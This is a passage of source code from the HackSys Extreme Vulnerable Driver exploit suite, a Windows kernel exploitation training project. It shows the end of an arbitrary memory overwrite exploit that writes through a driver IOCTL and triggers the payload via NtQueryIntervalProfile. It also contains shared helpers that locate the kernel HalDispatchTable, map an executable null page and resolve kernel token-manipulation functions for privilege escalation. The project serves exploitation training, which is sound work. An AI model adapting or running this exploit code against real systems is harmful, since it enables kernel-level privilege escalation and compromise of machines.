        DEBUG_INFO("\t\t\t[+] WriteWhatWhere->What: 0x%p\n", WriteWhatWhere->What);
        DEBUG_INFO("\t\t\t[+] WriteWhatWhere->Where: 0x%p\n", WriteWhatWhere->Where);

        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);

        DEBUG_MESSAGE("\t[+] Triggering Arbitrary Memory Overwrite\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
                        (LPVOID)WriteWhatWhere,
                        sizeof(WRITE_WHAT_WHERE),
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        DEBUG_INFO("\t\t[+] Triggering Payload\n");

        hNtDll = LoadLibrary("ntdll.dll");

        if (!hNtDll) {
            DEBUG_ERROR("\t\t[-] Failed loading NtDll: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }

        NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hNtDll, "NtQueryIntervalProfile");

        if (!NtQueryIntervalProfile) {
            DEBUG_ERROR("\t\t[-] Failed Resolving NtQueryIntervalProfile: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }

        NtQueryIntervalProfile(0x1337, &Interval);

        HeapFree(GetProcessHeap(), 0, (LPVOID)WriteWhatWhere);

        WriteWhatWhere = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}

```

`Exploit/ArbitraryOverwrite.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    ArbitraryOverwrite.h

Abstract:
    This module implements the data structures used by the
    exploit for Arbitrary Memory Overwrite Vulnerability
    implemented in HackSys Extreme Vulnerable Driver.

--*/

#ifndef __ARBITRARY_OVERWRITE_H__
    #define __ARBITRARY_OVERWRITE_H__

    #pragma once

    #include "Common.h"

    typedef struct _WRITE_WHAT_WHERE {
        PULONG_PTR What;
        PULONG_PTR Where;
    } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

    DWORD WINAPI    ArbitraryOverwriteThread(LPVOID Parameter);

#endif  //__ARBITRARY_OVERWRITE_H__

```

`Exploit/Common.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    Common.c

Abstract:
    This module implements the methods which are 
    common to all the exploit modules.

--*/

#include "Common.h"

VOID ClearScreen() {
    //
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms682022(v=vs.85).aspx
    //

    DWORD ConSize;
    HANDLE hConsole;
    DWORD CharsWritten;
    COORD CoordScreen = {0, 0};
    CONSOLE_SCREEN_BUFFER_INFO ConsoleScreenBufferInfo;

    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    if (!GetConsoleScreenBufferInfo(hConsole, &ConsoleScreenBufferInfo)) {
        return;
    }

    ConSize = ConsoleScreenBufferInfo.dwSize.X * ConsoleScreenBufferInfo.dwSize.Y;

    if (!FillConsoleOutputCharacter(hConsole,
                                    (TCHAR)' ',
                                    ConSize,
                                    CoordScreen,
                                    &CharsWritten )) {
        return;
    }

    if (!GetConsoleScreenBufferInfo(hConsole, &ConsoleScreenBufferInfo)) {
        return;
    }

    if (!FillConsoleOutputAttribute(hConsole,
                                    ConsoleScreenBufferInfo.wAttributes,
                                    ConSize,
                                    CoordScreen,
                                    &CharsWritten)) {
        return;
    }

    SetConsoleCursorPosition(hConsole, CoordScreen);
}


VOID ColoredConsoleOuput(WORD wColor, CONST PTCHAR fmt, ...) {
    SIZE_T Length = 0;
    PTCHAR DebugString;
    va_list args = NULL;
    HANDLE hConsoleOutput;
    WORD CurrentAttributes;
    CONSOLE_SCREEN_BUFFER_INFO ConsoleScreenBufferInfo;

    va_start(args, fmt);
    Length = _vscprintf(fmt, args) + 2;
    DebugString = (PTCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Length * sizeof(TCHAR));
    hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    GetConsoleScreenBufferInfo(hConsoleOutput, &ConsoleScreenBufferInfo);
    CurrentAttributes = ConsoleScreenBufferInfo.wAttributes;
    SetConsoleTextAttribute(hConsoleOutput, FOREGROUND_INTENSITY | wColor);

    vfprintf(stderr, fmt, args);
    vsprintf_s(DebugString, Length, fmt, args);
    OutputDebugString(DebugString);

    SetConsoleTextAttribute(hConsoleOutput, CurrentAttributes);
    va_end(args);
    HeapFree(GetProcessHeap(), 0, (LPVOID)DebugString);
}

VOID CenterConsoleScreen() {
    HWND hConsoleWindow = GetConsoleWindow();
    int xPos = (GetSystemMetrics(SM_CXSCREEN) - 680) / 2;
    int yPos = ((GetSystemMetrics(SM_CYSCREEN) - 350) / 2) - 150;
    MoveWindow(hConsoleWindow, xPos, yPos, 700, 600, TRUE);
}

HANDLE GetDeviceHandle(LPCSTR FileName) {
    HANDLE hFile = NULL;

    hFile = CreateFile(FileName,
                       GENERIC_READ | GENERIC_WRITE,
                       FILE_SHARE_READ | FILE_SHARE_WRITE,
                       NULL,
                       OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
                       NULL);

    return hFile;
}

DWORD GetProcessID(LPCSTR ProcessName) {
    ULONG ProcessID = 0;
    HANDLE hProcessSnapshot = NULL;
    PROCESSENTRY32 ProcessEntry32 = {0};
    ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);

    // Create the snapshot of all processes
    hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (!hProcessSnapshot) {
        DEBUG_ERROR("\t\t[-] Failed Creating Snapshot Of Processes: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    if (!Process32First(hProcessSnapshot, &ProcessEntry32)) {
        DEBUG_ERROR("\t\t[-] Failed To Get Info About First Process: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    do {
        if (strcmp(ProcessName, ProcessEntry32.szExeFile) == 0) {
            ProcessID = ProcessEntry32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnapshot, &ProcessEntry32));

    CloseHandle(hProcessSnapshot);

    return ProcessID;
}

PVOID GetHalDispatchTable() {
    PCHAR KernelImage;
    SIZE_T ReturnLength;
    HMODULE hNtDll = NULL;
    PVOID HalDispatchTable = NULL;
    HMODULE hKernelInUserMode = NULL;
    PVOID KernelBaseAddressInKernelMode;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;

    hNtDll = LoadLibrary("ntdll.dll");

    if (!hNtDll) {
        DEBUG_ERROR("\t\t\t[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtQuerySystemInformation: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);

    // Allocate the Heap chunk
    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),
                                                                     HEAP_ZERO_MEMORY,
                                                                     ReturnLength);

    if (!pSystemModuleInformation) {
        DEBUG_ERROR("\t\t\t[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    NtStatus = NtQuerySystemInformation(SystemModuleInformation,
                                        pSystemModuleInformation,
                                        ReturnLength,
                                        &ReturnLength);

    if (NtStatus != STATUS_SUCCESS) {
        DEBUG_ERROR("\t\t\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
    KernelImage = strrchr((PCHAR)(pSystemModuleInformation->Module[0].ImageName), '\\') + 1;

    DEBUG_INFO("\t\t\t[+] Loaded Kernel: %s\n", KernelImage);
    DEBUG_INFO("\t\t\t[+] Kernel Base Address: 0x%p\n", KernelBaseAddressInKernelMode);
    
    hKernelInUserMode = LoadLibraryA(KernelImage);

    if (!hKernelInUserMode) {
        DEBUG_ERROR("\t\t\t[-] Failed To Load Kernel: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    // This is still in user mode
    HalDispatchTable = (PVOID)GetProcAddress(hKernelInUserMode, "HalDispatchTable");

    if (!HalDispatchTable) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving HalDispatchTable: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        HalDispatchTable = (PVOID)((ULONG_PTR)HalDispatchTable - (ULONG_PTR)hKernelInUserMode);

        // Here we get the address of HapDispatchTable in Kernel mode
        HalDispatchTable = (PVOID)((ULONG_PTR)HalDispatchTable + (ULONG_PTR)KernelBaseAddressInKernelMode);

        DEBUG_INFO("\t\t\t[+] HalDispatchTable: 0x%p\n", HalDispatchTable);
    }

    HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);

    if (hNtDll) {
        FreeLibrary(hNtDll);
    }

    if (hKernelInUserMode) {
        FreeLibrary(hKernelInUserMode);
    }

    hNtDll = NULL;
    hKernelInUserMode = NULL;
    pSystemModuleInformation = NULL;

    return HalDispatchTable;
}

BOOL MapNullPage() {
    HMODULE hNtdll;
    SIZE_T RegionSize = 0x1000;            // will be rounded up to the next host
                                           // page size address boundary -> 0x2000

    PVOID BaseAddress = (PVOID)0x00000001; // will be rounded down to the next host
                                           // page size address boundary -> 0x00000000
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;

    hNtdll = GetModuleHandle("ntdll.dll");

    // Grab the address of NtAllocateVirtualMemory
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

    if (!NtAllocateVirtualMemory) {
        DEBUG_ERROR("\t\t[-] Failed Resolving NtAllocateVirtualMemory: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    // Allocate the Virtual memory
    NtStatus = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
                                       &BaseAddress,
                                       0,
                                       &RegionSize,
                                       MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
                                       PAGE_EXECUTE_READWRITE);

    if (NtStatus != STATUS_SUCCESS) {
        DEBUG_ERROR("\t\t\t\t[-] Virtual Memory Allocation Failed: 0x%x\n", NtStatus);
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] Memory Allocated: 0x%p\n", BaseAddress);
        DEBUG_INFO("\t\t\t[+] Allocation Size: 0x%X\n", RegionSize);
    }

    FreeLibrary(hNtdll);

    return TRUE;
}

VOID ResolveKernelAPIs() {
    PCHAR KernelImage;
    SIZE_T ReturnLength;
    HMODULE hNtDll = NULL;
    PVOID HalDispatchTable = NULL;
    HMODULE hKernelInUserMode = NULL;
    PVOID KernelBaseAddressInKernelMode;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;

    DEBUG_INFO("\t\t[+] Resolving Kernel APIs\n");

    hNtDll = LoadLibrary("ntdll.dll");
    if (!hNtDll) {
        DEBUG_ERROR("\t\t\t[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtDll, "NtAllocateVirtualMemory");
    if (!NtAllocateVirtualMemory) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtAllocateVirtualMemory: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtAllocateVirtualMemory: 0x%p\n", NtAllocateVirtualMemory);
    }

    NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtQuerySystemInformation: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtQuerySystemInformation: 0x%p\n", NtQuerySystemInformation);
    }

    NtSetInformationProcess = (NtSetInformationProcess_t)GetProcAddress(hNtDll, "NtSetInformationProcess");
    if (!NtSetInformationProcess) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtSetInformationProcess: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtSetInformationProcess: 0x%p\n", NtSetInformationProcess);
    }

    NtCreateDirectoryObject = (NtCreateDirectoryObject_t)GetProcAddress(hNtDll, "NtCreateDirectoryObject");
    if (!NtCreateDirectoryObject) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtCreateDirectoryObject: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtCreateDirectoryObject: 0x%p\n", NtCreateDirectoryObject);
    }

    NtOpenDirectoryObject = (NtOpenDirectoryObject_t)GetProcAddress(hNtDll, "NtOpenDirectoryObject");
    if (!NtOpenDirectoryObject) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtOpenDirectoryObject: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtOpenDirectoryObject: 0x%p\n", NtOpenDirectoryObject);
    }

    NtCreateSymbolicLinkObject = (NtCreateSymbolicLinkObject_t)GetProcAddress(hNtDll, "NtCreateSymbolicLinkObject");
    if (!NtCreateSymbolicLinkObject) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtCreateSymbolicLinkObject: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtCreateSymbolicLinkObject: 0x%p\n", NtCreateSymbolicLinkObject);
    }

    RtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(hNtDll, "RtlInitUnicodeString");
    if (!RtlInitUnicodeString) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving RtlInitUnicodeString: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] RtlInitUnicodeString: 0x%p\n", RtlInitUnicodeString);
    }

    NtMapUserPhysicalPages = (NtMapUserPhysicalPages_t)GetProcAddress(hNtDll, "NtMapUserPhysicalPages");
    if (!NtMapUserPhysicalPages) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtMapUserPhysicalPages: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtMapUserPhysicalPages: 0x%p\n", NtMapUserPhysicalPages);
    }

    NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);

    // Allocate the Heap chunk
    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),
                                                                     HEAP_ZERO_MEMORY,
                                                                     ReturnLength);
    if (!pSystemModuleInformation) {
        DEBUG_ERROR("\t\t\t[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtStatus = NtQuerySystemInformation(SystemModuleInformation,
                                        pSystemModuleInformation,
                                        ReturnLength,
                                        &ReturnLength);
    if (NtStatus != STATUS_SUCCESS) {
        DEBUG_ERROR("\t\t\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
    KernelImage = strrchr((PCHAR)(pSystemModuleInformation->Module[0].ImageName), '\\') + 1;

    hKernelInUserMode = LoadLibraryA(KernelImage);
    if (!hKernelInUserMode) {
        DEBUG_ERROR("\t\t\t[-] Failed To Load Kernel: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    ZwOpenProcess = (ZwOpenProcess_t)GetProcAddress(hKernelInUserMode, "ZwOpenProcess");
    if (!ZwOpenProcess) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwOpenProcess: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwOpenProcess = (ZwOpenProcess_t)((ULONG)ZwOpenProcess - (ULONG)hKernelInUserMode);
        ZwOpenProcess = (ZwOpenProcess_t)((ULONG)ZwOpenProcess + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwOpenProcess: 0x%p\n", ZwOpenProcess);
    }

    ZwOpenProcessToken = (ZwOpenProcessToken_t)GetProcAddress(hKernelInUserMode, "ZwOpenProcessToken");
    if (!ZwOpenProcessToken) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwOpenProcessToken: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwOpenProcessToken = (ZwOpenProcessToken_t)((ULONG)ZwOpenProcessToken - (ULONG)hKernelInUserMode);
        ZwOpenProcessToken = (ZwOpenProcessToken_t)((ULONG)ZwOpenProcessToken + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwOpenProcessToken: 0x%p\n", ZwOpenProcess);
    }

    ZwDuplicateToken = (ZwDuplicateToken_t)GetProcAddress(hKernelInUserMode, "ZwDuplicateToken");
    if (!ZwDuplicateToken) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwDuplicateToken: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwDuplicateToken = (ZwDuplicateToken_t)((ULONG)ZwDuplicateToken - (ULONG)hKernelInUserMode);
        ZwDuplicateToken = (ZwDuplicateToken_t)((ULONG)ZwDuplicateToken + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwDuplicateToken: 0x%p\n", ZwDuplicateToken);
    }

    PsGetCurrentProcess = (PsGetCurrentProcess_t)GetProcAddress(hKernelInUserMode, "PsGetCurrentProcess");
    if (!PsGetCurrentProcess) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving PsGetCurrentProcess: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        PsGetCurrentProcess = (PsGetCurrentProcess_t)((ULONG)PsGetCurrentProcess - (ULONG)hKernelInUserMode);
        PsGetCurrentProcess = (PsGetCurrentProcess_t)((ULONG)PsGetCurrentProcess + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] PsGetCurrentProcess: 0x%p\n", PsGetCurrentProcess);
    }

    PsLookupProcessByProcessId = (PsLookupProcessByProcessId_t)GetProcAddress(hKernelInUserMode, "PsLookupProcessByProcessId");
    if (!PsLookupProcessByProcessId) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving PsLookupProcessByProcessId: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        PsLookupProcessByProcessId = (PsLookupProcessByProcessId_t)((ULONG)PsLookupProcessByProcessId - (ULONG)hKernelInUserMode);
        PsLookupProcessByProcessId = (PsLookupProcessByProcessId_t)((ULONG)PsLookupProcessByProcessId + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] PsLookupProcessByProcessId: 0x%p\n", PsLookupProcessByProcessId);
    }

    PsReferencePrimaryToken = (PsReferencePrimaryToken_t)GetProcAddress(hKernelInUserMode, "PsReferencePrimaryToken");
    if (!PsReferencePrimaryToken) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving PsReferencePrimaryToken: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        PsReferencePrimaryToken = (PsReferencePrimaryToken_t)((ULONG)PsReferencePrimaryToken - (ULONG)hKernelInUserMode);
        PsReferencePrimaryToken = (PsReferencePrimaryToken_t)((ULONG)PsReferencePrimaryToken + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] PsReferencePrimaryToken: 0x%p\n", PsReferencePrimaryToken);
    }

    ZwSetInformationProcess = (ZwSetInformationProcess_t)GetProcAddress(hKernelInUserMode, "ZwSetInformationProcess");
    if (!ZwSetInformationProcess) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwSetInformationProcess: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwSetInformationProcess = (ZwSetInformationProcess_t)((ULONG)ZwSetInformationProcess - (ULONG)hKernelInUserMode);
        ZwSetInformationProcess = (ZwSetInformationProcess_t)((ULONG)ZwSetInformationProcess + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwSetInformationProcess: 0x%p\n", ZwSetInformationProcess);
    }

    ZwClose = (ZwClose_t)GetProcAddress(hKernelInUserMode, "ZwClose");
    if (!ZwClose) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwClose: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwClose = (ZwClose_t)((ULONG)ZwClose - (ULONG)hKernelInUserMode);
        ZwClose = (ZwClose_t)((ULONG)ZwClose + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwClose: 0x%p\n", ZwClose);
    }

    HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);

    if (hNtDll) {
        FreeLibrary(hNtDll);
    }

    if (hKernelInUserMode) {
        FreeLibrary(hKernelInUserMode);
    }

    hNtDll = NULL;
    hKernelInUserMode = NULL;
    pSystemModuleInformation = NULL;
}

ULONG GetNumberOfProcessors() {
    SYSTEM_INFO SystemInfo;

    GetSystemInfo(&SystemInfo);

    return (ULONG)SystemInfo.dwNumberOfProcessors;
}

```

`Exploit/Common.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    Common.h

Abstract:
    This module implements the data structures which is
    common to all the exploit modules.

--*/

#ifndef __COMMON_H__
    #define __COMMON_H__

    #pragma once

    #include <time.h>
    #include <stdio.h>
    #include <Windows.h>
    #include <Psapi.h>
    #include <winioctl.h>
    #include <TlHelp32.h>

    #include "Payloads.h"
    #include "DoubleFetch.h"
    #include "PoolOverflow.h"
    #include "UseAfterFree.h"
    #include "StackOverflow.h"
    #include "TypeConfusion.h"
    #include "StackOverflowGS.h"
    #include "IntegerOverflow.h"
    #include "ArbitraryOverwrite.h"
    #include "NullPointerDereference.h"
    #include "UninitializedHeapVariable.h"
    #include "UninitializedStackVariable.h"
    #include "InsecureKernelResourceAccess.h"

    #define BUFFER_SIZE 512
    #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
    #define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
    #define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
    #define RandomNumber(Minimum, Maximum) (rand()%(int)(Maximum - Minimum) + Minimum)

    #define OBJ_CASE_INSENSITIVE   0x00000040
    #define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)
    #define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)

    #define InitializeObjectAttributes(i, o, a, r, s) {  \
                (i)->Length = sizeof(OBJECT_ATTRIBUTES); \
                (i)->RootDirectory = r;                  \
                (i)->Attributes = a;                     \
                (i)->ObjectName = o;                     \
                (i)->SecurityDescriptor = s;             \
                (i)->SecurityQualityOfService = NULL;    \
            }

    #define DEBUG_INFO(fmt, ...) do { ColoredConsoleOuput(FOREGROUND_BLUE, fmt, ##__VA_ARGS__); } while (0)
